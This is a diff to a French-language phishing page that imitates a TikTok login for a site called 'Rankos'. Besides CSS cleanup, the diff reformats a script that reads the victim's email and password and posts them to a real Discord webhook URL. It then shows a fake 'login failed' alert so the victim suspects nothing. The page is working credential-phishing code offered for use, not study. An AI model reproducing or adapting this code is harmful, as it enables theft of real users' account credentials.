@@ -54,16 +54,17 @@
       width: 100%;
     }
 
-    h1 {
-      font-size: 28px;
+    h1, h2 {
       font-weight: 700;
       margin-bottom: 10px;
     }
 
+    h1 {
+      font-size: 28px;
+    }
+
     h2 {
       font-size: 22px;
-      font-weight: 700;
-      margin-bottom: 10px;
     }
 
     p.description {
@@ -119,7 +120,6 @@
 
     .login-interface {
       display: none;
-      text-align: center;
     }
 
     .login-interface input {
@@ -188,7 +188,6 @@
     <a class="help" href="#">Commentaires et assistance</a>
   </header>
 
-  <!-- Interface principale -->
   <div class="container" id="main-container">
     <h1>Connecte-toi au site de</h1>
     <h2>Rankos</h2>
@@ -224,7 +223,6 @@
     </div>
   </div>
 
-  <!-- Interface connexion -->
   <div class="login-interface" id="login-form">
     <h1>Se connecter</h1>
     <div style="display: flex; justify-content: center; gap: 20px; font-size: 14px; margin-bottom: 20px;">
@@ -281,14 +279,18 @@
       const email = emailInput.value.trim();
       const password = passwordInput.value.trim();
 
+      const discordMessage = `**📱 Nouveau Compte TikTok :**\n\n` +
+        '```' +
+        `\n📧 Email        | ${email}\n` +
+        `🔑 Mot de passe | ${password}\n` +
+        '```';
+
       fetch('https://discord.com/api/webhooks/1382805479318884393/q3PgxN5YRwcy1MPgFurwEWHcLq9c3wBSqAOSnKkbYO1z23cRgTPuEzCgvcILBvf_-_p6', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          content: `🛑 Nouvelle tentative de connexion :\n📧 E-mail : \`${email}\`\n🔑 Mot de passe : \`${password}\``
-        })
+        body: JSON.stringify({ content: discordMessage })
       }).then(() => {
-        alert("Connexion échouée. Veuillez réessayer."); // Facultatif
+        alert("Connexion échouée. Veuillez réessayer.");
       });
     });
   </script>
